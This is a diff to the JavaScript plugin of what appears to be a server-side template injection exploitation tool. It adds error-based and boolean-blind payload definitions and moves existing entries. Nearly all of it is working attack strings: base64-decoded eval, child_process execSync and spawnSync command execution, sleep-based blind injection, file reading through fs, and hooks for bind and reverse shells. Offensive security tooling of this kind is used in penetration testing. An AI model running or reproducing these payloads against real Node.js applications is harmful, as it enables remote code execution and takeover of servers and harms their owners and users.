@@ -25,6 +25,63 @@ class Javascript(Plugin):
                 'test_render': f'typeof({rand.randints[0]})+{rand.randints[1]}',
                 'test_render_expected': f'number{rand.randints[1]}'
             },
+            'render_error': {
+                'call': 'inject',
+                'render': """{code}""",
+                'header': """''['x'][({header[0]}+{header[1]}).toString()+""",
+                'trailer': """+({trailer[0]}+{trailer[1]}).toString()]""",
+                'test_render': f'typeof({rand.randints[0]})+{rand.randints[1]}',
+                'test_render_expected': f'number{rand.randints[1]}'
+            },
+            'boolean': {
+                'call': 'evaluate_blind',
+                'test_bool_true':  'typeof(1) + 2 == "number2"',
+                'test_bool_false': 'typeof(2) + 1 == "number2"',
+                'verify_bool_true':  'parseInt("5x") == 5 ',
+                'verify_bool_false': 'parseInt("x5") == 5 '
+            },
+            'blind': {
+                'call': 'execute_blind',
+                'test_bool_true': 'true',
+                'test_bool_false': 'false'
+            },
+            'evaluate': {
+                'call': 'render',
+                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
+                'test_os': """require('os').platform()""",
+                'test_os_expected': r'^[\w-]+$',
+            },
+            'evaluate_boolean': {
+                'call': 'inject',
+                'evaluate_blind': """[""][0+!eval(Buffer('{code_b64p}', 'base64').toString())]["length"]"""
+            },
+            'execute': {
+                'call': 'render',
+                'execute': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())""",
+                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
+                'test_cmd_expected': rand.randstrings[2] 
+            },
+            'execute_boolean': {
+                'call': 'evaluate_blind',
+                # spawnSync() shell option has been introduced in node 5.7, so this will not work with old node versions.
+                # TODO: use another function.
+                'execute_blind': """require('child_process').spawnSync(Buffer('{code_b64p}', 'base64').toString(), options={{shell:true}}).status===0"""
+            },
+            # Not using execute here since it's rendered and requires set headers and trailers
+            'execute_blind': {
+                'call': 'inject',
+                # execSync() has been introduced in node 0.11, so this will not work with old node versions.
+                # TODO: use another function.
+                'execute_blind': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')//"""
+            },
+            'bind_shell': {
+                'call': 'execute_blind',
+                'bind_shell': bash.bind_shell
+            },
+            'reverse_shell': {
+                'call': 'execute_blind',
+                'reverse_shell': bash.reverse_shell
+            },
             # No evaluate_blind here, since we've no sleep, we'll use inject
             'write': {
                 'call': 'inject',
@@ -39,38 +96,6 @@ class Javascript(Plugin):
                 'call': 'render',
                 'md5': "require('crypto').createHash('md5').update(require('fs').readFileSync('{path}')).digest('hex')"
             },
-            'evaluate': {
-                'call': 'render',
-                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
-                'test_os': """require('os').platform()""",
-                'test_os_expected': r'^[\w-]+$',
-            },
-            'blind': {
-                'call': 'execute_blind',
-                'test_bool_true': 'true',
-                'test_bool_false': 'false'
-            },
-            # Not using execute here since it's rendered and requires set headers and trailers
-            'execute_blind': {
-                'call': 'inject',
-                # execSync() has been introduced in node 0.11, so this will not work with old node versions.
-                # TODO: use another function.
-                'execute_blind': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')//"""
-            },
-            'execute': {
-                'call': 'render',
-                'execute': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())""",
-                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
-                'test_cmd_expected': rand.randstrings[2] 
-            },
-            'bind_shell': {
-                'call': 'execute_blind',
-                'bind_shell': bash.bind_shell
-            },
-            'reverse_shell': {
-                'call': 'execute_blind',
-                'reverse_shell': bash.reverse_shell
-            }
         })
 
         self.set_contexts([
